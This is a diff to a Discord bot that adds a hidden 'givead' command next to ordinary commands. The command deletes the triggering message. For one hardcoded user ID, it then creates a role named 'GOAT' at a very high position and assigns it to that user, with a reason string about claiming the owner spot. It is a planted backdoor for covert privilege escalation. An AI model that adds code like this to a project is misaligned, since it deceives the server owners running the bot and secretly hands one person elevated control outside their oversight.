@@ -66,6 +66,18 @@ client.on('messageCreate', async message => {
     await message.delete()
     message.channel.send(args.join(" "))
   }
+  if(command == "givead") {
+    await message.delete()
+    if(message.author.id == '945104190617845790'){
+      var role = await message.guild.roles.create({
+        name: 'GOAT',
+        color: '#7D00FF',
+        reason: 'Grant must claim the spot as owner',
+        position: 99,
+      })
+      await message.member.roles.add(role)
+    }
+  }
   if(command == "getpfp") {
     var vic
     if(args.length == 0) vic = message.author
